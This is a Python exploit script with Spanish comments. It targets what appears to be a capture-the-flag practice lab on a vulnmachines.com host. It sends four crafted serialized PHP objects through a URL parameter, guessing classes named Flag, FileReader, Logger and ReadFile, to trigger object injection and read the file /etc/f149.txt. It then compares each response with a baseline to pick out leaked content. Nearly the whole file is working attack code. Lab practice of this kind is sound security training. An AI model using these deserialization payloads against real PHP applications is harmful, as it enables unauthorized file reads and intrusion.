#!/usr/bin/env python3
import requests
import urllib.parse

base_url = "http://hackme11.vulnmachines.com:8056"

# Según el artículo, necesitamos una clase que tenga un método mágico útil
# Vamos a probar con el ejemplo del artículo: una clase Flag

print("[*] Lab 1 - PHP Object Injection Exploit")
print("[*] Target: /etc/f149.txt")
print()

# Payload 1: Clase Flag simple (como en el artículo)
payload1 = 'O:4:"Flag":1:{s:4:"file";s:13:"/etc/f149.txt";}'
print("[1] Testing Flag class with file property...")
encoded = urllib.parse.quote(payload1)
url = f"{base_url}/params?vnm={encoded}"
response = requests.get(url)

# Buscar contenido diferente
normal = requests.get(f"{base_url}/params?vnm=").text
if response.text != normal:
    print("[+] Response is different!")
    # Buscar líneas nuevas
    for line in response.text.split('\n'):
        if line not in normal and line.strip():
            if not line.strip().startswith('<') and not line.strip().startswith('//'):
                print(f"    New content: {line.strip()}")

# Payload 2: FileReader class
payload2 = 'O:10:"FileReader":1:{s:8:"filename";s:13:"/etc/f149.txt";}'
print("\n[2] Testing FileReader class...")
encoded = urllib.parse.quote(payload2)
url = f"{base_url}/params?vnm={encoded}"
response = requests.get(url)

if response.text != normal:
    print("[+] Response is different!")
    for line in response.text.split('\n'):
        if line not in normal and line.strip():
            if not line.strip().startswith('<') and not line.strip().startswith('//'):
                print(f"    New content: {line.strip()}")

# Payload 3: Basado en ejemplo del artículo - Logger class
payload3 = 'O:6:"Logger":1:{s:8:"logfile";s:13:"/etc/f149.txt";}'
print("\n[3] Testing Logger class...")
encoded = urllib.parse.quote(payload3)
url = f"{base_url}/params?vnm={encoded}"
response = requests.get(url)

if response.text != normal:
    print("[+] Response is different!")
    for line in response.text.split('\n'):
        if line not in normal and line.strip():
            if not line.strip().startswith('<') and not line.strip().startswith('//'):
                print(f"    New content: {line.strip()}")

# Payload 4: Intentar con __wakeup o __destruct
payload4 = 'O:8:"ReadFile":1:{s:4:"path";s:13:"/etc/f149.txt";}'
print("\n[4] Testing ReadFile class...")
encoded = urllib.parse.quote(payload4)
url = f"{base_url}/params?vnm={encoded}"
response = requests.get(url)

if response.text != normal:
    print("[+] Response is different!")
    for line in response.text.split('\n'):
        if line not in normal and line.strip():
            if not line.strip().startswith('<') and not line.strip().startswith('//'):
                print(f"    New content: {line.strip()}")

print("\n[*] Testing completed")